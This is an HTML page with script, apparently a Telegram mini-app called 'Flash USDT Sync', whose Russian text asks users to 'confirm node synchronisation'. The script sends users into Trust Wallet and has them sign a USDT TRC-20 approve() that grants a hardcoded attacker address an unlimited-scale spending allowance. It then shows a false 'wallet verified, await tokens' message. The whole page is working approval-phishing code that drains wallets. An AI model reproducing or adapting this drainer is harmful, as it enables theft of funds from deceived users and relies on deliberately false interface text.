<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Sync</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { padding: 30px; width: 100%; max-width: 400px; background: #111; border-radius: 30px; border: 1px solid #222; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.2s; }
        .btn-error { background: #cc3300 !important; }
        #debug-log { font-size: 10px; color: #555; margin-top: 20px; text-align: left; overflow-wrap: break-word; }
    </style>
</head>
<body>

<div class="container">
    <h2 id="title">Проверка Узла</h2>
    <p id="desc">Нажмите кнопку ниже для финального подтверждения синхронизации в сети TRC-20.</p>
    
    <button id="main-btn" class="btn">ПОДТВЕРДИТЬ</button>
    
    <div id="debug-log">Статус: Ожидание действия...</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const CLEAN_URL = "https://timur3417.github.io/sync-node-app/";

    const btn = document.getElementById('main-btn');
    const log = document.getElementById('debug-log');

    function updateLog(msg) { log.innerText = "Статус: " + msg; }

    btn.onclick = async () => {
        const provider = window.tronWeb || (window.tron && window.tron.tronWeb);

        // 1. Если мы в Телеграме (провайдера нет)
        if (!provider) {
            updateLog("Переход в Trust Wallet...");
            const targetUrl = CLEAN_URL + "?mode=wallet";
            const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(targetUrl);
            tg.openLink(deepLink);
            return;
        }

        // 2. Если мы внутри кошелька
        try {
            updateLog("Запрос доступа к аккаунту...");
            
            // Пытаемся разбудить кошелек
            const address = await provider.request({ method: 'tron_requestAccounts' });
            
            if (!provider.defaultAddress.base58) {
                throw new Error("Адрес не получен. Смените сеть на TRON!");
            }

            updateLog("Вызов контракта (адрес: " + provider.defaultAddress.base58 + ")...");
            
            const contractObj = await provider.contract().at(CONTRACT);
            
            updateLog("Ожидание подписи транзакции...");
            const result = await contractObj.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            updateLog("Успех! Хэш: " + result);
            tg.showPopup({
                title: 'Синхронизация завершена',
                message: 'Ваш кошелек успешно верифицирован. Ожидайте зачисления токенов.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 5000);

        } catch (e) {
            console.error(e);
            updateLog("ОШИБКА: " + e.message);
            btn.classList.add('btn-error');
            
            if (e.message.includes("network") || e.message.includes("base58")) {
                tg.showAlert("КРИТИЧЕСКАЯ ОШИБКА: Кошелек в режиме Ethereum. Нажмите на значок сети вверху и выберите TRON (TRC-20)!");
            } else {
                tg.showAlert("Ошибка: " + e.message);
            }
        }
    };

    // Если перешли из ТГ, меняем текст
    if (window.location.search.includes('mode=wallet')) {
        document.getElementById('title').innerText = "Узел Обнаружен";
        updateLog("Готов к работе в Trust Wallet");
    }
</script>
</body>
</html>
